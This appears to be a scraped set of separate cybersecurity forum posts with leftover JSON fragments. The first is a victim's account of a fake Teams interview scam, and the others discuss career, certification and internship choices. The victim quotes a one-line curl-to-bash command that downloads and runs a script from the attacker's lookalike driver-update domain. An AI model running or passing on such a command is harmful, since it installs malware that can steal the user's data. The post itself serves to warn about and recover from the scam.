I joined the call and the environment was identical to MS Teams. He joined after 3 mins but the video was frozen. I got a popup saying that you might have to install a driver to properly show video and audio for MS Teams. I stupidly clicked on the link \\`https://learn.bitget-meeting.com/en-us/troubleshoot/microsoftteams/teams-on-mac/teams-audio-issue-mac\\`, which was identical again to Microsoft webpages, and executed the following\n\n    /bin/bash -c \"$(curl -fsSL https://apple.driver-update.io/troubleshoot/mac/audio-issue-fix.sh)\"\n\nThe recruiter asked me for my phone number to call me and I had a 20 mins discussion about the role with an AI bot...\n\nAfter I stopped talking to it, I froze. I understood what I had done and decided to wipe the script and the downloaded binary from everywhere. ChatGPT was very helpful with the process and immediately identified that this script does indeed look harmful.\n\nI would like to ask you what more can I do to make sure that the downloaded binary did not install anything on my machine or my browser that might exfiltrate data? I have already checked:\n\n* Brave extensions\n* Removed the folder created by the sh script\n* I deleted the \\`coreaudiod\\` file. It cannot be found anywhere on my machine. No mention of \\`apple.driver-update.io\\` driver\n* No weird LaunchAgents or LaunchDaemons\n* Uninstalled Teams and Zoom (should have done this a long time ago)\n* Installed LuLu, NetIQuette and KnockKnock (no weird things there)",

I’m currently enrolled in school for cybersecurity, and outside of that I’ve spent the last 7+ years working hands-on with PCs, troubleshooting hardware/software issues, and doing a lot of problem-solving with gaming consoles and general tech.\n\nI’m not going in completely blind, but since this is my first formal IT interview, I’m looking to get a general idea of what I should expect from the recruiter. I know every company is different, but any insight into the types of questions, technical topics, or soft skills they may focus on would be greatly appreciated.\n\nThanks in advance!",

Do you think it is a bad idea to work a temporary summer job and then use that money to fund different personal projects and gain different certifications (currently have security plus) thinking of getting network plus and maybe looking into different hackthebox and tryhackme certs for technicals along with building up my current homelab for more technical experience with firewalls, dynamic DNS, SIEM systems and etc? I was also thinking about attending different cyber conferences aswell to help with connections.\n\nDo you think that this is a bad idea?

The content is freely available on YouTube and elsewhere on the internet but they will set the tone and contain the foundations of what someone in cybersecurity would need to know.\n\nDon’t worry about projects unless you have an idea and a deep desire but I would hope your institution has a capstone to do before graduation and that will be your project.\n\nYou’re in your first year so I always advise to not worry about these things until it is clear that this is what you want.

      "text": "I’m a college student trying to decide between two internship paths and would appreciate some outside perspective.\n\nI recently received an offer through a federal civilian internship program. The role is officially an IT student trainee position, based on system administration and general IT work in a secure government environment. It is in person, tied to a military base, and includes a security clearance path. Long-term, it can potentially lead to a full-time federal role, but the work itself is more IT-focused rather than a dedicated cybersecurity position.\n\nAt the same time, I’ve been offered a private-sector internship that is explicitly a cybersecurity internship. The work would involve hands-on security tasks and tools, and the role aligns directly with information security. I previously completed an IT internship, so this private-sector role feels like a more direct continuation into cyber.\n\nMy main dilemma is choosing between:\n\n\t•\tA cybersecurity-specific internship with more direct hands-on security experience\n\n\t•\tA federal IT role with clearance, stability, and long-term government/defense career leverage, but less guaranteed cyber depth\n\nI’m interested in cybersecurity long-term, but I’m also trying to think strategically about career leverage, not just job titles. I already have general IT experience, which is why I’m torn.\n\nFor people who’ve been in similar situations or have experience in government vs private-sector cyber, how would you weigh this decision early in your career?",

From what I've seen, they often mention how students have very little experience in actual \"cyber security\". You should look on LinkedIn at other students who have had internships at those same places possibly and ask if they have some time (give exact time like 10 min or something) to ask about their internship there and their experience. Ask who they worked with and so on.\n\nYou could also research others who were in the \"goal\" roles of said positions, if they're available to view on social and see how long they've been there.\n\nYou should always go for experience for the role you want. While there, use that as an opportunity to build really good relationships and ask them about their career path. In general, since cybersecurity is more specialized and since, its competitive to even get a job to get that experience, it's going to be the better route.\n\nHowever, even after learning all the info you get...learn to trust your gut instinct. The more you get in tune with this and if you actually measure what does it means to have a \"gut feeling\" and when, you will familiarize yourself in choosing the right path, no matter where you go. So, trust your gut.",

There is a whole world of opportunity available to you in govtech that is essentially walled off to those without a clearance, and since it isn’t something you can get on your own (sponsorship is required), you are adding yourself to a short list of candidates for future opportunities.\n\nAnd here’s part two of why I would do it…you can always determine you don’t like the government sector and bolt for the civilian world.  No harm, no foul besides a missed cyber-specific internship.  You can hate the bureaucracy of being a government civilian and still utilize the clearance as a contractor where there is much less red tape, or once you are “in” you can look for lateral transfers into cyber.  \n\nAnd anecdotally…I know quite a few people who were great IT professionals who jumped at their first chance for a cybersecurity role and found out the hard way that the vast majority of cyber roles are not hands-on keyboard operators who are spending more time in Microsoft Excel than they are tools of the trade…and once they had that realization, they resigned their positions and moved back into the administration/engineering side of the house.\n\nBest of luck no matter what you choose.",

The contract roles I see all pay < 60/hr and its a race to the bottom\n\nHaving said that, do you realistically think you can pivot to GRC, audit, or other non tech security roles? Have you considered consulting, sales engineering, account management? It’s less of a technical grind and has more financial upside ",
